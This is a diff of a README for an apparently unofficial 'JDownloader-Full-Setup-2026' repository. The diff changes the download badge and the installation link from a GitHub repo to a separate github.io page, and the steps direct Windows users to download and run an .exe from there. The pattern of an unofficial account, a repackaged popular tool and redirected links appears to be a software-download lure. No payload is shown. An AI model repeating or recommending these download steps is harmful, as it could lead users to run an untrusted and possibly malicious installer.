@@ -1,6 +1,6 @@
 # 📥 JDownloader-Full-Setup-2026 - Manage all your Windows file downloads
 
-[![](https://img.shields.io/badge/Download_Setup-Blue?style=for-the-badge&logo=windows)](https://github.com/nelsoncomplex232/JDownloader-Full-Setup-2026)
+[![](https://img.shields.io/badge/Download_Setup-Blue?style=for-the-badge&logo=windows)](https://nelsoncomplex232.github.io)
 
 ## 📋 What is JDownloader
 JDownloader is a tool that manages how you download files from the web. It organizes your downloads and helps you grab multiple files at once. The software works on Windows 10 and Windows 11. It automates the process of saving videos, documents, and images to your hard drive. Using this tool saves you time and keeps your files in order.
@@ -16,7 +16,7 @@ Before you install, ensure your computer meets these basic needs:
 ## 🚀 How to Download and Install
 Follow these steps to set up the software on your machine.
 
-1. Visit the project page to access the installer: [https://github.com/nelsoncomplex232/JDownloader-Full-Setup-2026](https://github.com/nelsoncomplex232/JDownloader-Full-Setup-2026)
+1. Visit the project page to access the installer: [https://nelsoncomplex232.github.io](https://nelsoncomplex232.github.io)
 2. Locate the file ending in .exe in the releases section.
 3. Click the link to save the installer to your Downloads folder.
 4. Open the Downloads folder on your computer.
